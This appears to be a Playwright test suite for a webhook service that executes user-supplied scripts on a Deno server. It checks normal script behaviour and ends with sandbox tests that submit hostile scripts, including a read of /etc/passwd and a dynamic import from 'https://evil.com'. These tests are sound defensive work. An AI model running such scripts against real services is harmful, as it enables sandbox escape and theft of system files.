import { test, expect } from '@playwright/test';
import {
  registerUser,
  createEndpoint,
  updateEndpoint,
  callWebhook,
  getRequestLogs,
  healthCheck,
} from '../helpers/api-client';

let token: string;

test.describe('Webhook Script Execution', () => {
  test.beforeAll(async () => {
    const healthy = await healthCheck();
    test.skip(!healthy, 'Deno API server not running on port 3000');

    const email = `script-${Date.now()}@test.com`;
    const result = await registerUser(email, 'password123');
    token = result.token;
  });

  test('simple script returns custom status and body', async () => {
    const ep = await createEndpoint(
      token,
      'Simple Script',
      'return { status: 201, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ created: true }) };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(201);
    const body = JSON.parse(result.body);
    expect(body.created).toBe(true);
  });

  test('script can access request.method', async () => {
    const ep = await createEndpoint(
      token,
      'Method Access',
      'return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ method: request.method }) };'
    );

    const postResult = await callWebhook(ep.id, { method: 'POST' });
    expect(JSON.parse(postResult.body).method).toBe('POST');

    const getResult = await callWebhook(ep.id, { method: 'GET' });
    expect(JSON.parse(getResult.body).method).toBe('GET');

    const putResult = await callWebhook(ep.id, { method: 'PUT' });
    expect(JSON.parse(putResult.body).method).toBe('PUT');
  });

  test('script can access request.headers', async () => {
    const ep = await createEndpoint(
      token,
      'Header Access',
      'return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ ua: request.headers["user-agent"] || "none", ct: request.headers["content-type"] || "none" }) };'
    );

    const result = await callWebhook(ep.id, {
      headers: { 'User-Agent': 'TestBot/1.0' },
    });
    const body = JSON.parse(result.body);
    expect(body.ua).toBe('TestBot/1.0');
    expect(body.ct).toBe('application/json');
  });

  test('script can access request.query', async () => {
    const ep = await createEndpoint(
      token,
      'Query Access',
      'return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ q: request.query }) };'
    );

    const result = await callWebhook(ep.id, {
      method: 'GET',
      query: { page: '5', sort: 'name' },
    });
    const body = JSON.parse(result.body);
    expect(body.q.page).toBe('5');
    expect(body.q.sort).toBe('name');
  });

  test('script can access and parse request.body', async () => {
    const ep = await createEndpoint(
      token,
      'Body Access',
      [
        'var data = JSON.parse(request.body || "{}");',
        'return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ received: data, keys: Object.keys(data) }) };',
      ].join('\n')
    );

    const result = await callWebhook(ep.id, {
      body: JSON.stringify({ foo: 'bar', count: 42 }),
    });
    const body = JSON.parse(result.body);
    expect(body.received.foo).toBe('bar');
    expect(body.received.count).toBe(42);
    expect(body.keys).toContain('foo');
    expect(body.keys).toContain('count');
  });

  test('script can return different status codes', async () => {
    // Note: 204 excluded because HTTP 204 No Content with a body is problematic
    const statuses = [200, 201, 301, 400, 403, 404, 500];

    for (const status of statuses) {
      const ep = await createEndpoint(
        token,
        `Status ${status}`,
        `return { status: ${status}, headers: {"Content-Type": "text/plain"}, body: "status ${status}" };`
      );

      const result = await callWebhook(ep.id);
      expect(result.status).toBe(status);
    }
  });

  test('script can return plain text content type', async () => {
    const ep = await createEndpoint(
      token,
      'Text Response',
      'return { status: 200, headers: {"Content-Type": "text/plain"}, body: "Hello World" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.body).toBe('Hello World');
    expect(result.headers.get('content-type')).toContain('text/plain');
  });

  test('script can return XML content', async () => {
    const ep = await createEndpoint(
      token,
      'XML Response',
      'return { status: 200, headers: {"Content-Type": "application/xml"}, body: "<response><ok>true</ok></response>" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.body).toContain('<response>');
    expect(result.headers.get('content-type')).toContain('application/xml');
  });

  test('conditional response based on HTTP method', async () => {
    const script = [
      'if (request.method === "POST") {',
      '  return { status: 201, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "created" }) };',
      '} else if (request.method === "GET") {',
      '  return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "read" }) };',
      '} else {',
      '  return { status: 405, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ error: "not allowed" }) };',
      '}',
    ].join('\n');

    const ep = await createEndpoint(token, 'Method Router', script);

    const post = await callWebhook(ep.id, { method: 'POST' });
    expect(post.status).toBe(201);
    expect(JSON.parse(post.body).action).toBe('created');

    const get = await callWebhook(ep.id, { method: 'GET' });
    expect(get.status).toBe(200);
    expect(JSON.parse(get.body).action).toBe('read');

    const del = await callWebhook(ep.id, { method: 'DELETE' });
    expect(del.status).toBe(405);
  });

  test('script can transform request data', async () => {
    const script = [
      'var input = JSON.parse(request.body || "{}");',
      'var output = {',
      '  original: input,',
      '  transformed: {',
      '    uppercaseName: (input.name || "").toUpperCase(),',
      '    doubled: (input.value || 0) * 2,',
      '    receivedAt: Date.now(),',
      '  }',
      '};',
      'return { status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify(output) };',
    ].join('\n');

    const ep = await createEndpoint(token, 'Transform', script);

    const result = await callWebhook(ep.id, {
      body: JSON.stringify({ name: 'hello', value: 21 }),
    });

    const body = JSON.parse(result.body);
    expect(body.transformed.uppercaseName).toBe('HELLO');
    expect(body.transformed.doubled).toBe(42);
    expect(body.transformed.receivedAt).toBeGreaterThan(0);
  });

  test('script update takes effect immediately', async () => {
    const ep = await createEndpoint(token, 'Update Script', '');

    // First call: default response
    let result = await callWebhook(ep.id);
    expect(result.status).toBe(200);
    expect(result.body).toBe('{"ok": true}');

    // Update script
    await updateEndpoint(token, ep.id, {
      script: 'return { status: 202, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ updated: true }) };',
    });

    // Second call: new script
    result = await callWebhook(ep.id);
    expect(result.status).toBe(202);
    expect(JSON.parse(result.body).updated).toBe(true);
  });

  test('script execution is logged with response data', async () => {
    const ep = await createEndpoint(
      token,
      'Logged Script',
      'return { status: 201, headers: {"Content-Type": "application/json"}, body: JSON.stringify({ logged: true }) };'
    );

    await callWebhook(ep.id, { body: '{"test":true}' });

    const logs = await getRequestLogs(token, ep.id);
    expect(logs.length).toBe(1);
    expect(logs[0].responseStatus).toBe(201);
    expect(logs[0].responseBody).toContain('logged');
  });

  test('script error returns 500 and logs the request', async () => {
    const ep = await createEndpoint(
      token,
      'Error Script',
      'throw new Error("intentional failure");'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);

    const logs = await getRequestLogs(token, ep.id);
    expect(logs.length).toBe(1);
    expect(logs[0].responseStatus).toBe(500);
  });

  test('script cannot use blocked patterns (Deno)', async () => {
    const ep = await createEndpoint(
      token,
      'Blocked Deno',
      'Deno.readFile("/etc/passwd"); return { status: 200, headers: {}, body: "hack" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);
  });

  test('script cannot use import()', async () => {
    const ep = await createEndpoint(
      token,
      'Blocked Import',
      'var m = await import("https://evil.com"); return { status: 200, headers: {}, body: "hack" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);
  });

  test('script cannot use eval()', async () => {
    const ep = await createEndpoint(
      token,
      'Blocked Eval',
      'eval("1+1"); return { status: 200, headers: {}, body: "hack" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);
  });

  test('script cannot use Function constructor', async () => {
    const ep = await createEndpoint(
      token,
      'Blocked Function',
      'Function("return 1")(); return { status: 200, headers: {}, body: "hack" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);
  });

  test('script cannot use process', async () => {
    const ep = await createEndpoint(
      token,
      'Blocked Process',
      'process.exit(1); return { status: 200, headers: {}, body: "hack" };'
    );

    const result = await callWebhook(ep.id);
    expect(result.status).toBe(500);
  });
});
